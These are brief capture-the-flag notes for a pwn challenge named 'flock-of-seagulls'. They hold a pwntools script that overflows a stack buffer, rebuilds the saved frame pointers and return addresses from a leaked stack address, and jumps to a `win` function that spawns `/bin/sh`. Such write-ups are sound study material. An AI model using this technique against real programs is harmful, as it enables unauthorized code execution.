# flock-of-seagulls

https://youtu.be/qA6ajf7qZtQ?si=q6Rm8rqf4xg_9z3w&t=1543

- ghidra, another `win` function which pops `/bin/sh`
- `func1` -> `func2` -> `func3` -> `func4` -> `func5` reads in input, here we buffer overflow it
- each of these functions are checking the return address
- there is also an output that leaks the stack pointer address
- gdb
- need to make sure that base pointers and return addresses are preserved properly


```py
# normal pwn tool stuff above ...

print(f'{hex(leak)=}')

payload = pwn.flat({
    16 * 8: leak + (0x7fffffffe4c0 - 0x7fffffffe420),
    17 * 8: 0x401276, # func4

    20 * 8: leak + (0x7fffffffe4e0 - 0x7fffffffe420),
    21 * 8: 0x4012a0, # func3

    24 * 8: leak + (0x7fffffffe500 - 0x7fffffffe420),
    25 * 8: 0x4012ca, # func2

    28 * 8: leak + (0x7fffffffe510 - 0x7fffffffe420),
    29 * 8: 0x4012f0, # func1

    30 * 8: leak + (0x7fffffffe520 - 0x7fffffffe420),

    31 * 8: 0x4012f2, # align stack pointer
    32 * 8: elf.sym['win']
})

p.sendlineafter(b'>', payload)
p.interactive()
```
